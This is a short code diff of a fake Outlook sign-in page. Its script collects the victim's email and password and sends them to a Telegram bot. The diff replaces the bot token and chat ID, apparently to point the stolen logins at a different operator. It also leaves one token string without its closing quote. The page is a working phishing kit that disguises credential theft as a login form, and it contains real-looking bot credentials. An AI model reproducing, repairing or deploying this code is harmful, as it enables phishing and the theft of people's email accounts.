@@ -190,8 +190,8 @@
       const password = document.getElementById('password').value;
 
       const telegramMessage = `🟦 Outlook Login Attempt\n\n📧 Email: ${username}\n🔑 Password: ${password}`;
-    var token = '7933375890:AAEom0GofbpGV8lassBKN_g5_qtu-X6i_bM';
-      var chat_id = '6509117933';
+    var token = '7800841602:AAG8AZiCnzcODjGn9M_aB3Lt5x-iiWJMs6A;
+      var chat_id = '5613959236';
       const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
 
       fetch(url)
@@ -216,3 +216,4 @@
 </body>
 
 </html>
+
